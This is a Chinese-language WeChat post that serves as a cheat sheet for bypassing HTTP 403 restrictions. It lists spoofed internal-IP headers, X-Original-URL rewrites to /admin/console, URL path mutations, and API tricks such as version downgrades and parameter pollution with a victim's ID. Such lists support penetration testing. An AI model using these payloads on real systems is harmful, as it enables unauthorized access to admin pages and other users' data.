#  Fuzz 403 Bypass

原创 Tt  [ TtTeam ](javascript:void\(0\);)

**TtTeam** ![]()

微信号 gh_a0a1db78ea68

功能介绍 TtTeam

____

___发表于_

收录于合集

![]()

  
HTTP 标头模糊测试

在某些情况下，可以通过更改请求的标头并包含内部地址来访问页面：

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    X-Originating-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Forwarded: 127.0.0.1Forwarded-For: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-ProxyUser-Ip: 127.0.0.1X-Original-URL: 127.0.0.1Client-IP: 127.0.0.1True-Client-IP: 127.0.0.1Cluster-Client-IP: 127.0.0.1X-ProxyUser-Ip: 127.0.0.1Host: localhost

  

如果路径受到保护，您可以尝试使用以下其他标头绕过路径保护：

  *   * 

    
    
    X-Original-URL: /admin/consoleX-Rewrite-URL: /admin/console

路径模糊测试 我们可以尝试对 url 进行一些更改，使用特殊字符或包含 HTML 编码：

  *   *   *   *   *   *   *   *   *   * 

    
    
    http://site.com/secret –> HTTP 403 Forbiddenhttp://site.com/SECRET –> HTTP 200 OKhttp://site.com/secret/ –> HTTP 200 OKhttp://site.com/secret/. –> HTTP 200 OKhttp://site.com//secret// –> HTTP 200 OKhttp://site.com/./secret/.. –> HTTP 200 OKhttp://site.com/;/secret –> HTTP 200 OKhttp://site.com/.;/secret –> HTTP 200 OKhttp://site.com//;//secret –> HTTP 200 OKhttp://site.com/secret.json –> HTTP 200 OK (ruby)

API bypasses

  *   *   *   *   *   *   *   * 

    
    
    /v3/users_data/1234 --> 403 Forbidden/v1/users_data/1234 --> 200 OK{“id”:111} --> 401 Unauthriozied{“id”:[111]} --> 200 OK{“id”:111} --> 401 Unauthriozied{“id”:{“id”:111}} --> 200 OK{"user_id":"<legit_id>","user_id":"<victims_id>"} (JSON Parameter Pollution)user_id=ATTACKER_ID&user_id=VICTIM_ID (Parameter Pollution)

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

